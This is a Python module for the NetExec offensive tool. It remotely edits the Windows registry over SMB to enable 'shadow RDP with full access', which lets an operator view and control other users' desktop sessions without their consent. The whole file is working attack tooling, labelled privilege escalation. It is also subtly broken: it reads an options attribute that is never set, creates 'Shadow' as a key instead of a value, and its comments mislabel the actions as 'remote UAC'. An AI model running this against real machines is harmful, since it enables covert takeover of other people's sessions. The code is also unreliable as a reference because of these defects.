from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY


# Module by @Defte_
# Enables or disables shadow RDP
class NXCModule:
    name = "shadowrdp"
    description = "Enables or disables shadow RDP"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    @staticmethod
    def register_module_options(subparsers):
        group = subparsers.add_mutually_exclusive_group(required=True)
        group.add_argument("--enable", help="Enable shadow RDP", action="store_true", dest="enable")
        group.add_argument("--disable", help="Disable shadow RDP", action="store_true", dest="disable")
        subparsers.set_defaults(module="shadowrdp")
        return subparsers

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.action = module_options

    def on_admin_login(self, context, connection):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()
            if remoteOps._RemoteOperations__rrp:
                ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
                regHandle = ans["phKey"]

                keyHandle = rrp.hBaseRegOpenKey(
                    remoteOps._RemoteOperations__rrp,
                    regHandle,
                    "Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\\"
                )["phkResult"]

                # Checks if the key already exists or not
                try:
                    rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00")
                except Exception as e:
                    if "ERROR_FILE_NOT_FOUND" in str(e):
                        context.log.debug("here")
                        ans = rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00")

                # Disable remote UAC
                if self.module_options.disable:
                    rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00", rrp.REG_DWORD, 0)
                    context.log.highlight("Shadow RDP disabled")

                # Enable remote UAC
                if self.module_options.enable:
                    rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "Shadow\x00", rrp.REG_DWORD, 2)
                    context.log.highlight("Shadow RDP with full access enabled")

        except Exception as e:
            context.log.debug(f"Error {e}")
        finally:
            remoteOps.finish()
